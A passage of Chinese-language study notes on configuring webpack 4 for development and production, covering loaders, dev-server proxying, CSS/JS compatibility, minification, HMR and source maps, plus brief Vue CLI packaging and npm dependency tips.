               // 给图片进行重命名
               // [hash:10]取图片的hash的前10位
               // [ext]取文件原来扩展名
               name: '[hash:10].[ext]',
                // 输出文件夹，相对于build文件下
               outputPath: 'imgs'
             }
           },
           {
             test: /\.less$/,
             // 要使用多个loader处理用use
             use: ['style-loader', 'css-loader', 'less-loader']
           }

         ]
       },
       plugins: [
         new HtmlWebpackPlugin({
           template: './src/index.html'
         })
       ],
       mode: 'development'
     };
```

4. 运行指令: webpack

### 打包其他资源 

1. 创建文件

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505220422.png" alt="image-20210226142039333" style="zoom:80%;" />

2. 修改配置文件 

```
     const { resolve } = require('path');
     const HtmlWebpackPlugin = require('html-webpack-plugin');

     module.exports = {
       entry: './src/index.js',
       output: {
         filename: 'built.js',
         path: resolve(__dirname, 'build')
       },
       module: {
         rules: [
          //!处理其他资源
      	 {
        		exclude: /\.(js|css|less|html|jpg|png|gif|vue)/,
       		 loader: 'file-loader',
       		 options: {
               // 当加载的图片小于limit时，会将图片编译成base64字符串形式
               //当加载的土拍你大于limit时，需要使用file-loader模块进行加载
               // [hash:10]取图片的hash的前10位
               //[name]是指原来的名字
               // [ext]取文件原来扩展名
               name: '[name].[hash:8].[ext]',
               // 输出文件夹，相对于build文件下
               outputPath: 'media'
             }
     	 }
           {
             test: /\.css$/,
             use: ['style-loader', 'css-loader']
           },
           // 打包其他资源(除了html/js/css资源以外的资源)
         ]
       },
       plugins: [
         new HtmlWebpackPlugin({
           template: './src/index.html'
         })
       ],
       mode: 'development'
     };
```

4. 运行指令: webpack 

### 配置devserver 

1. 创建文件

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505220426.png" alt="image-20210226142228647" style="zoom:80%;" />

安装 npm i webpack-dev-server -D

2. 修改配置文件

```
const { resolve } = require('path');
const HtmlWebpackPlugin = require('html-webpack-plugin');

module.exports = {
  entry: './src/js/index.js',
  output: {
    filename: 'js/built.js',
    path: resolve(__dirname, 'build')
  },
  module: {
    rules: [
      // loader的配置
      {
        // 处理less资源
        test: /\.less$/,
        use: ['style-loader', 'css-loader', 'less-loader']
      },
      {
        // 处理css资源
        test: /\.css$/,
        use: ['style-loader', 'css-loader']
      },
      {
        // 处理图片资源
        test: /\.(jpg|png|gif)$/,
        loader: 'url-loader',
        options: {
          limit: 8 * 1024,
          name: '[hash:10].[ext]',
          // 关闭es6模块化
          esModule: false,
          outputPath: 'imgs'
        }
      },
      {
        // 处理html中img资源
        test: /\.html$/,
        loader: 'html-loader'
      },
      {
        // 处理其他资源
        exclude: /\.(html|js|css|less|jpg|png|gif)/,
        loader: 'file-loader',
        options: {
          name: '[hash:10].[ext]',
          outputPath: 'media'
        }
      }
    ]
  },
  plugins: [
    // plugins的配置
    new HtmlWebpackPlugin({
      template: './src/index.html'
    })
  ],
  /*
  开发环境配置：能让代码运行
    运行项目指令：
      webpack 会将打包结果输出出去
      npx webpack-dev-server 只会在内存中编译打包，没有输出
  */
  mode: 'development',
  devServer: {
   // 这里最好和项目构建后路径一样，把打包生成的目录设为根目录，只不过是模拟生成的而已
    // 这里是根目录，静态资源都是相对于这个路径的
    contentBase: resolve(__dirname, 'build'),
    // 启动它gzip压缩
    compress: true,
    // 端口号
    port: 3000,
    // 自动打开浏览器
    open: true
  }
};
```

4. 运行指令: npx webpack-dev-server 

webpack-dev-server还有其他很多妙用：比如代理处理跨域、热替换等等

1、代理处理跨域

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210326090205.png" alt="image-20210326090205349" style="zoom: 67%;" />

```
//解决跨域问题
  devServer: {
    proxy: {  //配置跨域
      '/api': {
        target: 'http://121.121.67.254:8185/',  //这里后台的地址模拟的;应该填写你们真实的后台接口
        changeOrigin: true,  //允许跨域
        pathRewrite: {
          /* 重写路径，当我们在浏览器中看到请求的地址为：http://localhost:8080/api/core/getData/userInfo 时
            实际上访问的地址是：http://121.121.67.254:8185/core/getData/userInfo,因为重写了 /api
           */
          '^/api': ''
        }
      },
    }
  },
```

如果是vue项目，我们应该写在vue.config.js中

```
module.exports = {
  //解决跨域问题
  devServer: {
    proxy: {  //配置跨域
      '/api': {
        target: 'http://121.121.67.254:8185/',  //这里后台的地址模拟的;应该填写你们真实的后台接口
        changeOrigin: true,  //允许跨域
        pathRewrite: {
          /* 重写路径，当我们在浏览器中看到请求的地址为：http://localhost:8080/api/core/getData/userInfo 时
            实际上访问的地址是：http://121.121.67.254:8185/core/getData/userInfo,因为重写了 /api
           */
          //这里是取出api
          '^/api': ''
        }
      },
    }
  },
}
```

`注意：如果使用代理，那么axios请求就不需要写域名和ip了，否则还会报错`

![image-20210326084618241](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210326084618.png)

`需要把域名端口去掉，或者加上和网页运行的域名端口，而不是服务器的域名和端口，服务器的端口和域名，代理会进行处理转发`

热替换下面介绍

### 开发环境配置

1.创建文件

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505220429.png" alt="image-20210226142313243" style="zoom:80%;" />

2. 修改配置文件 

   webpack.config.js

```
     const { resolve } = require('path');
     const HtmlWebpackPlugin = require('html-webpack-plugin');
     module.exports = {
       entry: './src/js/index.js',
       output: {
         filename: 'js/built.js',
         path: resolve(__dirname, 'build')
       },
       module: {
         rules: [
           // loader的配置
           {
             // 处理less资源
             test: /\.less$/,
             use: ['style-loader', 'css-loader', 'less-loader']
           },
           {
             // 处理css资源
             test: /\.css$/,
             use: ['style-loader', 'css-loader']
           },
           {
             // 处理图片资源
             test: /\.(jpg|png|gif)$/,
             loader: 'url-loader',
             options: {
               limit: 8 * 1024,
               name: '[hash:10].[ext]',
               // 关闭es6模块化
               esModule: false,
               outputPath: 'imgs'
             }
           },
           {
             // 处理html中img资源
             test: /\.html$/,
             loader: 'html-loader'
           },
           {
             // 处理其他资源
             exclude: /\.(html|js|css|less|jpg|png|gif)/,
             loader: 'file-loader',
             options: {
               name: '[hash:10].[ext]',
               outputPath: 'media'
             }
           }
         ]
       },
       plugins: [
         // plugins的配置
         new HtmlWebpackPlugin({
           template: './src/index.html'
         })
       ],
       /*
       开发环境配置：能让代码运行
         运行项目指令：
           webpack 会将打包结果输出出去
           npx webpack-dev-server 只会在内存中编译打包，没有输出
       */
       mode: 'development',
       devServer: {
         contentBase: resolve(__dirname, 'build'),
         // 启动它gzip压缩
         compress: true,
         // 端口号
         port: 3000,
         // 自动打开浏览器
         open: true
       }
     };
```

package.json

```
{
  "name": "development",
  "version": "1.0.0",
  "description": "开发环境搭建",
  "main": "index.js",
  "scripts": {
    "build": "webpack",
    "serve": "webpack-dev-server"
  },
  "author": "",
  "license": "ISC",
  "devDependencies": {
    "css-loader": "^5.1.1",
    "file-loader": "^5.1.0",
    "html-loader": "^0.5.5",
    "html-webpack-plugin": "^3.2.0",
    "less": "^4.1.1",
    "less-loader": "^5.0.0",
    "style-loader": "^2.0.0",
    "url-loader": "^3.0.0",
    "webpack": "^4.41.6",
    "webpack-cli": "^3.3.11",
    "webpack-dev-server": "^3.10.3"
  }
}
```

运行指令: npx webpack-dev-server  打包使用webpack

## 生产环境

### 提取css/less成单独文件

1. 下载安装包 

   ![image-20210302141928999](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210302141929.png)

  2.下载插件 

​		npm install --save-dev mini-css-extract-plugin 

3. 修改配置文件 

```
     const { resolve } = require('path');
     const HtmlWebpackPlugin = require('html-webpack-plugin');
     const MiniCssExtractPlugin = require('mini-css-extract-plugin');
     module.exports = {
       entry: './main.js',
       output: {
         filename: 'js/built.js',
         path: resolve(__dirname, 'build')
       },
       module: {
         rules: [
           {
             test: /\.css$/,
             use: [
               // 创建style标签，将样式放入
               // 'style-loader', 
               // 这个loader取代style-loader。作用：提取js中的css成单独文件
               MiniCssExtractPlugin.loader,
               // 将css文件整合到js文件中
               'css-loader'
             ]
           },
           {
             test: /\.less$/,
             use: [
               // 创建style标签，将样式放入
               // 'style-loader', 
               // 这个loader取代style-loader。作用：提取js中的css成单独文件
               MiniCssExtractPlugin.loader,
               // 将css文件整合到js文件中
               'css-loader',
               'less-loader'
             ]
           }
         ]
       },
       plugins: [
         new HtmlWebpackPlugin({
           template: './src/index.html'
         }),
         new MiniCssExtractPlugin({
           // 对输出的css文件进行重命名
           filename: 'css/built.css'
         })
       ],
       mode: 'development'
     };
```

4 .运行指令: webpack

### css兼容性处理

1.创建文件 

![image-20210302144902972](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210302144903.png)

2.下载 loader 

npm install --save-dev postcss-loader postcss-preset-env 

3.修改配置文件 

```
     const { resolve } = require('path');
     const HtmlWebpackPlugin = require('html-webpack-plugin');
     const MiniCssExtractPlugin = require('mini-css-extract-plugin');

     module.exports = {
       entry: './main.js',
       output: {
         filename: 'js/built.js',
         path: resolve(__dirname, 'build')
       },
       module: {
         rules: [
           {
             test: /\.css$/,
             use: [
               // 创建style标签，将样式放入
               // 'style-loader', 
               // 这个loader取代style-loader。作用：提取js中的css成单独文件
               MiniCssExtractPlugin.loader,
               // 将css文件整合到js文件中
               'css-loader',
               //css兼容性处理
               {
                 loader: 'postcss-loader',
                 options: {
                   ident: 'postcss',
                   plugins: () => [
                     // postcss 的插件
                     require('postcss-preset-env')()]
                 }
               }
             ]
           },
           {
             test: /\.less$/,
             use: [
               // 创建style标签，将样式放入
               // 'style-loader', 
               // 这个loader取代style-loader。作用：提取js中的css成单独文件
               MiniCssExtractPlugin.loader,
               // 将css文件整合到js文件中
               'css-loader',
               {
                 loader: 'postcss-loader',
                 options: {
                 ident: 'postcss', 
                 plugins: () => [
                     // postcss 的插件
                     require('postcss-preset-env')()]
                 }
               },
               'less-loader'
             ]
           }
         ]
       },
       plugins: [
         new HtmlWebpackPlugin({
           template: './src/index.html'
         }),
         new MiniCssExtractPlugin({
           // 对输出的css文件进行重命名
           filename: 'css/built.css'
         })
       ],
       mode: 'development'
     };
```

4. 修改 package.json

   ```
   "browserslist": { 
   	"development": [ "last 1 chrome version", "last 1 firefox version", "last 1 safari version" ],
   	"production": [ ">0.2%", "not dead", "not op_mini all" ]
     }
   ```

   或者修改.browserslistrc文件

   ```
   [production staging]
   > 1%
   ie 10
    
   [development]
   last 1 chrome version
   last 1 firefox version
   ```

5. 运行指令: webpack

### 压缩css

1.创建文件

​	![image-20210302152140533](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210302152141.png)

2. 下载安装包 

   npm install --save-dev optimize-css-assets-webpack-plugin 

3. 修改配置文件 

   ```
   const { resolve } = require('path');
   //处理html模板
   const HtmlWebpackPlugin = require('html-webpack-plugin');
   //把css从js抽离成单独文件
   const MiniCssExtractPlugin = require('mini-css-extract-plugin');
   // 压缩 css 
   const OptimizeCssAssetsWebpackPlugin = require('optimize-css-assets-webpack-plugin')
   module.exports = {
     entry: './main.js',
     output: {
       filename: 'js/built.js',
       path: resolve(__dirname, 'build')
     },
     module: {
       rules: [
         {
           test: /\.css$/,
           use: [
             // 创建style标签，将样式放入
             // 'style-loader', 
             // 这个loader取代style-loader。作用：提取js中的css成单独文件
             MiniCssExtractPlugin.loader,
             // 将css文件整合到js文件中
             'css-loader',
             {
               loader: 'postcss-loader',
               options: {
                 ident: 'postcss',
                 plugins: () => [
                   // postcss 的插件
                   require('postcss-preset-env')()]
               }
             }
           ]
         },
         {
           test: /\.less$/,
           use: [
             // 创建style标签，将样式放入
             // 'style-loader', 
             // 这个loader取代style-loader。作用：提取js中的css成单独文件
             MiniCssExtractPlugin.loader,
             // 将css文件整合到js文件中
             'css-loader',
             {
               loader: 'postcss-loader',
               options: {
                 ident: 'postcss',
                 plugins: () => [
                   // postcss 的插件
                   require('postcss-preset-env')()]
               }
             },
             'less-loader'
           ]
         }
       ]
     },
     plugins: [
       //处理html模板
       new HtmlWebpackPlugin({
         template: './src/index.html'
       }),
       //把css从js抽离成单独文件
       new MiniCssExtractPlugin({
         // 对输出的css文件进行重命名
         filename: 'css/built.css'
       }),
       // 压缩 css 
       new OptimizeCssAssetsWebpackPlugin()
     ],
     mode: 'development'
   };
   ```

4. 运行指令npx webpack

### js语法检查

1.创建文件

![image-20210302154538295](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210302154538.png)

2. 下载安装包 

npm install --save-dev eslint-loader eslint eslint-config-airbnb-base eslint-plugin-import 

3. 修改配置文件

   ```
   const { resolve } = require('path');
   //处理html模板
   const HtmlWebpackPlugin = require('html-webpack-plugin');
   //把css从js抽离成单独文件
   const MiniCssExtractPlugin = require('mini-css-extract-plugin');
   // 压缩 css 
   const OptimizeCssAssetsWebpackPlugin = require('optimize-css-assets-webpack-plugin')
   module.exports = {
     entry: './main.js',
     output: {
       filename: 'js/built.js',
       path: resolve(__dirname, 'build')
     },
     module: {
       rules: [
         {
           test: /\.css$/,
           use: [
             // 创建style标签，将样式放入
             // 'style-loader', 
             // 这个loader取代style-loader。作用：提取js中的css成单独文件
             MiniCssExtractPlugin.loader,
             // 将css文件整合到js文件中
             'css-loader',
             {
               loader: 'postcss-loader',
               options: {
                 ident: 'postcss',
                 plugins: () => [
                   // postcss 的插件
                   require('postcss-preset-env')()]
               }
             }
           ]
         },
         {
           test: /\.less$/,
           use: [
             // 创建style标签，将样式放入
             // 'style-loader', 
             // 这个loader取代style-loader。作用：提取js中的css成单独文件
             MiniCssExtractPlugin.loader,
             // 将css文件整合到js文件中
             'css-loader',
             {
               loader: 'postcss-loader',
               options: {
                 ident: 'postcss',
                 plugins: () => [
                   // postcss 的插件
                   require('postcss-preset-env')()]
               }
             },
             'less-loader'
           ]
         },
         /*语法检查： eslint-loader eslint 注意：只检查自己写的源代码，第三方的库是不用检查的 
         npm install --save-dev eslint-loader eslint eslint-config-airbnb-base eslint-plugin-import
         设置检查规则： package.json 中 eslintConfig 中设置~
          "eslintConfig": { "extends": "airbnb-base" } airbnb --> eslint-config-airbnb-base eslint-plugin-import eslint */
         {
           test: /\.js$/,
           exclude: /node_modules/,
           loader: 'eslint-loader',
           options: {
             // 自动修复 eslint 的错误 
             fix: true
           }
         }
       ]
     },
     plugins: [
       //处理html模板
       new HtmlWebpackPlugin({
         template: './src/index.html'
       }),
       //把css从js抽离成单独文件
       new MiniCssExtractPlugin({
         // 对输出的css文件进行重命名
         filename: 'css/built.css'
       }),
       // 压缩 css 
       new OptimizeCssAssetsWebpackPlugin()
     ],
     mode: 'development'
   };
   ```

4. 配置 package.json 

   ```
   "eslintConfig": { "extends": "airbnb-base", "env": { "browser": true } }
   ```

5. 运行指令: npx webpack

### js兼容性处理

1.创建文件

![image-20210302160841263](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210302160842.png)\2. 下载安装包 

npm install --save-dev babel-loader @babel/core @babel/preset-env @babel/polyfill core-js 

3. 修改配置文件

   ```
   const { resolve } = require('path');
   //处理html模板
   const HtmlWebpackPlugin = require('html-webpack-plugin');
   //把css从js抽离成单独文件
   const MiniCssExtractPlugin = require('mini-css-extract-plugin');
   // 压缩 css 
   const OptimizeCssAssetsWebpackPlugin = require('optimize-css-assets-webpack-plugin')
   module.exports = {
     entry: './main.js',
     output: {
       filename: 'js/built.js',
       path: resolve(__dirname, 'build')
     },
     module: {
       rules: [
         {
           test: /\.css$/,
           use: [
             // 创建style标签，将样式放入
             // 'style-loader', 
             // 这个loader取代style-loader。作用：提取js中的css成单独文件
             MiniCssExtractPlugin.loader,
             // 将css文件整合到js文件中
             'css-loader',
             {
               loader: 'postcss-loader',
               options: {
                 ident: 'postcss',
                 plugins: () => [
                   // postcss 的插件
                   require('postcss-preset-env')()]
               }
             }
           ]
         },
         {
           test: /\.less$/,
           use: [
             // 创建style标签，将样式放入
             // 'style-loader', 
             // 这个loader取代style-loader。作用：提取js中的css成单独文件
             MiniCssExtractPlugin.loader,
             // 将css文件整合到js文件中
             'css-loader',
             {
               loader: 'postcss-loader',
               options: {
                 ident: 'postcss',
                 plugins: () => [
                   // postcss 的插件
                   require('postcss-preset-env')()]
               }
             },
             'less-loader'
           ]
         },
         /*语法检查： eslint-loader eslint 注意：只检查自己写的源代码，第三方的库是不用检查的 
         npm install --save-dev eslint-loader eslint eslint-config-airbnb-base eslint-plugin-import
         设置检查规则： package.json 中 eslintConfig 中设置~
          "eslintConfig": { "extends": "airbnb-base" } airbnb --> eslint-config-airbnb-base eslint-plugin-import eslint */
         {
           test: /\.js$/,
           exclude: /node_modules/,
           loader: 'eslint-loader',
           // 优先执行 
           enforce: 'pre',
           options: {
             // 自动修复 eslint 的错误 
             fix: true
           }
         },
         //js兼容性处理
         {
           test: /\.js$/,
           exclude: /node_modules/,
           loader: 'babel-loader',
           options: {
             // npm install --save- dev babel - loader @babel/core @babel/preset - env @babel/polyfill core-js
             // 预设：指示 babel 做怎么样的兼容性处理 
             presets: [['@babel/preset-env', {
               // 按需加载 
               useBuiltIns: 'usage',
               // 指定 core-js 版本 
               corejs: { version: 3 },
               // 指定兼容性做到哪个版本浏览器 
               targets: { chrome: '60', firefox: '60', ie: '9', safari: '10', edge: '17' }
             }]]
           }
         }
       ]
     },
     plugins: [
       //处理html模板
       new HtmlWebpackPlugin({
         template: './src/index.html'
       }),
       //把css从js抽离成单独文件
       new MiniCssExtractPlugin({
         // 对输出的css文件进行重命名
         filename: 'css/built.css'
       }),
       // 压缩 css 
       new OptimizeCssAssetsWebpackPlugin()
     ],
     mode: 'development'
   };
   ```

4、运行

​	npx webpack

### js压缩

1.创建文件 

2、修改配置文件

```
     // 生产环境下会自动压缩 js 代码 
     mode: 'production'
```

运行指令: npx webpack

### html压缩

1.创建文件

2、修改配置文件 

```
const { resolve } = require('path');
const HtmlWebpackPlugin = require('html-webpack-plugin');
module.exports = {
  entry: './src/js/index.js',
  output: {
    filename: 'js/built.js',
    path: resolve(__dirname, 'build')
  },
  plugins: [
    new HtmlWebpackPlugin({
      template: './src/index.html',
      // 压缩 html 代码 
      minify: {
        // 移除空格 
        collapseWhitespace: true,
        // 移除注释
        removeComments: true
      }
    })
  ],
  mode: 'production'
};
```

### 生产环境配置

配置

webpack.config.js

```
const { resolve } = require('path');
//处理html模板
const HtmlWebpackPlugin = require('html-webpack-plugin');
//把css从js抽离成单独文件
const MiniCssExtractPlugin = require('mini-css-extract-plugin');
// 压缩 css 
const OptimizeCssAssetsWebpackPlugin = require('optimize-css-assets-webpack-plugin')
// 定义nodejs环境变量：决定使用browserslist的哪个环境,这个browserslist是处理js兼容性使用的
process.env.NODE_ENV = 'production';
//复用Loader
const commonCssLoader = [
  // 创建style标签，将样式放入
  // 'style-loader', 
  // 这个loader取代style-loader。作用：提取js中的css成单独文件
  MiniCssExtractPlugin.loader,
  // 将css文件整合到js文件中
  'css-loader',
  //!css兼容性处理
  {
    loader: 'postcss-loader',
    options: {
      ident: 'postcss',
      plugins: () => [
        // postcss 的插件
        require('postcss-preset-env')()]
    }
  }
]
module.exports = {
  entry: './main.js',
  output: {
    filename: 'js/built.js',
    path: resolve(__dirname, 'build')
  },
  module: {
    rules: [
      //!css处理
      {
        test: /\.css$/,
        use: [...commonCssLoader]
      },
      //!less处理
      {
        test: /\.less$/,
        use: [...commonCssLoader, 'less-loader']
      },
      //!js语法检查
      /*语法检查： eslint-loader eslint 注意：只检查自己写的源代码，第三方的库是不用检查的 
      npm install --save-dev eslint-loader eslint eslint-config-airbnb-base eslint-plugin-import
      设置检查规则： package.json 中 eslintConfig 中设置~
       "eslintConfig": { "extends": "airbnb-base" } airbnb --> eslint-config-airbnb-base eslint-plugin-import eslint */
      {
        test: /\.js$/,
        exclude: /node_modules/,
        loader: 'eslint-loader',
        // 优先执行 
        enforce: 'pre',
        options: {
          // 自动修复 eslint 的错误 
          fix: true
        }
      },
      //!js兼容性处理
      {
        test: /\.js$/,
        exclude: /node_modules/,
        loader: 'babel-loader',
        options: {
          // npm install --save- dev babel - loader @babel/core @babel/preset - env @babel/polyfill core-js
          // 预设：指示 babel 做怎么样的兼容性处理 
          presets: [['@babel/preset-env', {
            // 按需加载 
            useBuiltIns: 'usage',
            // 指定 core-js 版本 
            corejs: { version: 3 },
            // 指定兼容性做到哪个版本浏览器 
            targets: { chrome: '60', firefox: '60', ie: '9', safari: '10', edge: '17' }
          }]]
        }
      },
      //!处理其他资源
      {
        exclude: /\.(js|css|less|html|jpg|png|gif|vue)/,
        loader: 'file-loader',
        options: {
          // 当加载的图片小于limit时，会将图片编译成base64字符串形式
          //当加载的土拍你大于limit时，需要使用file-loader模块进行加载
          // [hash:10]取图片的hash的前10位
          //[name]是指原来的名字
          // [ext]取文件原来扩展名
          name: '[name].[hash:8].[ext]',
          // 输出文件夹，相对于build文件下
          outputPath: 'media'
        }
      }
    ]
  },
  plugins: [
    //!处理html模板
    new HtmlWebpackPlugin({
      template: './src/index.html',
      // 压缩 html 代码 
      minify: {
        // 移除空格 
        collapseWhitespace: true,
        // 移除注释
        removeComments: true
      }
    }),
    //!把css从js抽离成单独文件
    new MiniCssExtractPlugin({
      // 对输出的css文件进行重命名
      filename: 'css/built.css'
    }),
    //! 压缩 css 
    new OptimizeCssAssetsWebpackPlugin()
  ],
  // 生产环境下会自动压缩 js 代码
  mode: 'production'
};
```

package.json

```
{
  "name": "production",
  "version": "1.0.0",
  "description": "",
  "main": "index.js",
  "scripts": {
    "test": "echo \"Error: no test specified\" && exit 1"
  },
  "author": "",
  "license": "ISC",
  "devDependencies": {
    "@babel/core": "^7.13.8",
    "@babel/polyfill": "^7.12.1",
    "@babel/preset-env": "^7.13.9",
    "babel-loader": "^8.2.2",
    "core-js": "^3.9.1",
    "css-loader": "^5.1.1",
    "eslint": "^7.21.0",
    "eslint-config-airbnb-base": "^14.2.1",
    "eslint-loader": "^4.0.2",
    "eslint-plugin-import": "^2.22.1",
    "html-webpack-plugin": "^3.2.0",
    "less": "^4.1.1",
    "less-loader": "^5.0.0",
    "mini-css-extract-plugin": "^0.9.0",
    "optimize-css-assets-webpack-plugin": "^5.0.4",
    "postcss-loader": "^3.0.0",
    "postcss-preset-env": "^6.7.0",
    "style-loader": "^2.0.0",
    "webpack": "^4.41.6",
    "webpack-cli": "^3.3.11"
  },
  "eslintConfig": {
    "extends": "airbnb-base",
    "env": {
      "browser": true
    }
  }
}
{
  "name": "production",
  "version": "1.0.0",
  "description": "",
  "main": "index.js",
  "scripts": {
    "test": "echo \"Error: no test specified\" && exit 1"
  },
  "author": "",
  "license": "ISC",
  "devDependencies": {
    "@babel/core": "^7.13.8",
    "@babel/polyfill": "^7.12.1",
    "@babel/preset-env": "^7.13.9",
    "babel-loader": "^8.2.2",
    "core-js": "^3.9.1",
    "css-loader": "^5.1.1",
    "eslint": "^7.21.0",
    "eslint-config-airbnb-base": "^14.2.1",
    "eslint-loader": "^4.0.2",
    "eslint-plugin-import": "^2.22.1",
    "html-webpack-plugin": "^3.2.0",
    "less": "^4.1.1",
    "less-loader": "^5.0.0",
    "mini-css-extract-plugin": "^0.9.0",
    "optimize-css-assets-webpack-plugin": "^5.0.4",
    "postcss-loader": "^3.0.0",
    "postcss-preset-env": "^6.7.0",
    "style-loader": "^2.0.0",
    "webpack": "^4.41.6",
    "webpack-cli": "^3.3.11"
  },
  "eslintConfig": {
    "extends": "airbnb-base",
    "env": {
      "browser": true
    }
  }
}
```

.browerslistrc

```
[production staging]
> 1%
ie 10
 
[development]
last 1 chrome version
last 1 firefox version
```

## 性能优化

### 开发环境性能优化

####  优化打包构建速度

>   HMR：hot module replacement 热模块替换/模块热替换
>
> ​			作用：一个模块发生变化，只会重新打包这一个模块（而不是打包所有模块）
>
> ​						极大提升构建速度

配置：

```
 //入口
  entry: ['./main.js', './src/index.html'],
 
 
 devServer: {
    // 这需要和项目构建后路径一样，把打包生成的目录设为根目录，只不过是模拟生成的而已
    contentBase: resolve(__dirname, 'build'),
    // 启动gzip压缩
    compress: true,
    // 端口号
    port: 3000,
    // 自动打开浏览器
    open: true,
    //! 开启 HMR 功能 
    // 当修改了 webpack 配置，新配置要想生效，必须重新开启webpack 服务 
    /*
      HMR: hot module replacement 热模块替换 / 模块热替换
        作用：一个模块发生变化，只会重新打包这一个模块（而不是打包所有模块） 
          极大提升构建速度
          
          样式文件：可以使用HMR功能：因为style-loader内部实现了~
          js文件：默认不能使用HMR功能 --> 需要修改js代码，添加支持HMR功能的代码
            注意：HMR功能对js的处理，只能处理非入口js文件的其他文件。
          html文件: 默认不能使用HMR功能.同时会导致问题：html文件不能热更新了~ （不用做HMR功能）
            解决：修改entry入口，将html文件引入entry: ['./main.js', './src/index.html'],
    */
    hot: true
  },
```

如果js需要处理的话（暂时还没完全理解）：

```
import res from './src/js/index'
import print from "./src/js/print"
import print2 from "./src/js/print2"
import './src/css/index.css';
import './src/css/index.less';
import './src/others/iconfont.css'
document.write('hello world')
console.log(res);
console.log('21323');
//为了可以自动隔离js更新，我们使用
if (module.hot) {
  // 一旦 module.hot 为true，说明开启了HMR功能。 --> 让HMR功能代码生效a
  const files = require.context('./src/js', true, /\.js$/);
  console.log(files);
  files.keys().map(key => {
    console.log('./src/js'+key.replace('.',''));
    module.hot.accept('./src/js' + key.replace('.', ''), function () {
      // 方法会监听 print.js 文件的变化，一旦发生变化，其他模块不会重新打包构建。
      // 会执行后面的回调函数
      // console.log(key);
      // key.replace('./js', '')()
      // console.log(key.replace('./js', ''));
      console.log(key);
    });
  })
}
```

#### 优化代码调试

>  source-map：一种提供源代码到构建后代码映射技术（如果后代码出错了，通过映射可以追踪源代码错误）

配置:

```
const { resolve } = require('path');
const HtmlWebpackPlugin = require('html-webpack-plugin');

module.exports = {
  entry: ['./src/js/index.js', './src/index.html'],
  output: {
    filename: 'js/built.js',
    path: resolve(__dirname, 'build')
  },
  module: {
    rules: [
      // loader的配置
      {
        // 处理less资源
        test: /\.less$/,
        use: ['style-loader', 'css-loader', 'less-loader']
      },
      {
        // 处理css资源
        test: /\.css$/,
        use: ['style-loader', 'css-loader']
      },
      {
        // 处理图片资源
        test: /\.(jpg|png|gif)$/,
        loader: 'url-loader',
        options: {
          limit: 8 * 1024,
          name: '[hash:10].[ext]',
          // 关闭es6模块化
          esModule: false,
          outputPath: 'imgs'
        }
      },
      {
        // 处理html中img资源
        test: /\.html$/,
        loader: 'html-loader'
      },
      {
        // 处理其他资源
        exclude: /\.(html|js|css|less|jpg|png|gif)/,
        loader: 'file-loader',
        options: {
          name: '[hash:10].[ext]',
          outputPath: 'media'
        }
      }
    ]
  },
  plugins: [
    // plugins的配置
    new HtmlWebpackPlugin({
      template: './src/index.html'
    })
  ],
  mode: 'development',
  devServer: {
    contentBase: resolve(__dirname, 'build'),
    compress: true,
    port: 3000,
    open: true,
    hot: true
  },
  //source-map配置
  devtool: 'eval-source-map'
};

```



```
/*
  source-map: 一种 提供源代码到构建后代码映射 技术 （如果构建后代码出错了，通过映射可以追踪源代码错误）

    [inline-|hidden-|eval-][nosources-][cheap-[module-]]source-map

    source-map：外部
      错误代码准确信息 和 源代码的错误位置
    inline-source-map：内联
      只生成一个内联source-map
      错误代码准确信息 和 源代码的错误位置
    hidden-source-map：外部
      错误代码错误原因，但是没有错误位置
      不能追踪源代码错误，只能提示到构建后代码的错误位置
    eval-source-map：内联
      每一个文件都生成对应的source-map，都在eval
      错误代码准确信息 和 源代码的错误位置
    nosources-source-map：外部
      错误代码准确信息, 但是没有任何源代码信息
    cheap-source-map：外部
      错误代码准确信息 和 源代码的错误位置 
      只能精确的行
    cheap-module-source-map：外部
      错误代码准确信息 和 源代码的错误位置 
      module会将loader的source map加入

    内联 和 外部的区别：1. 外部生成了文件，内联没有 2. 内联构建速度更快

    开发环境：速度快，调试更友好
      速度快(eval>inline>cheap>...)
        eval-cheap-souce-map
        eval-source-map
      调试更友好  
        souce-map
        cheap-module-souce-map
        cheap-souce-map

      --> eval-source-map  / eval-cheap-module-souce-map

    生产环境：源代码要不要隐藏? 调试要不要更友好
      内联会让代码体积变大，所以在生产环境不用内联
      nosources-source-map 全部隐藏
      hidden-source-map 只隐藏源代码，会提示构建后代码错误信息

      --> source-map / cheap-module-souce-map
*/
```

### 生产环境性能优化

\* 优化打包构建速度

 \* oneOf

 \* babel缓存

 \* 多进程打包

 \* externals

 \* dll

\* 优化代码运行的性能

 \* 缓存(hash-chunkhash-contenthash)

 \* tree shaking

 \* code split

 \* 懒加载/预加载

 \* pwa

#  Vue

## 环境安装

```
     npm install --global vue-cli
```

在vue.config.js中输入以下代码可以更简单使用文件路径：

```
     module.exports = {
       configureWebpack: {
         resolve: {
           alias: {
             assets: "@/assets",
             common: "@/common",
             components: "@/components",
             network: "@/network",
             views: "@/views"
           }
         }
       },
     };
```

引入全局css

在app.vue的style中引入

```
@import "./assets/css/base.css";
```

或者在main.js中引入

```
import "./assets/css/base.css";
```

打包Vue项目，

第一步：

在router得文件夹中的Index.js中的路由模式必须为hash模式（由于默认就是hash模式，所以我们不写也行，但不能写history模式）

```
     const router = new VueRouter({
       mode: 'hash',
       base: process.env.BASE_URL,
       routes
     })
```

第二步：

在vue.config.js中添加：

```
 	publicPath: "./"
```

![image-20201128141508724](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210405211627.png)

之后执行:npm run build

然后打包成功，并放置在asset文件夹

## package.json

**dependencies和devDependencies**的区别

为什么要分这两个东西来记录包呢？

举个例子，加入我们导入一个math模块

```
     require math from 'math'
     console.log(math)
```

这样的话我们必须要用到math模块，所以必须放到**dependencies**中，

但是我比如想打包很多文件，那么就需要用到webpack，但是并不是什么时候都要用到的，而且也不需要引入到项目代码中，仅仅作为工具使用，

npm install会把**dependencies和devDependencies**的依赖都安装，其实大部分项目我们都需要把两个环境的依赖都安装

如果你只是单纯的想使用这个包而不需要进行一些改动测试之类的操作，则运行：（只安装dependencies而不安装devDependencies。）

```
	npm install --production
```

如果想要安装devDependencies,则运行：

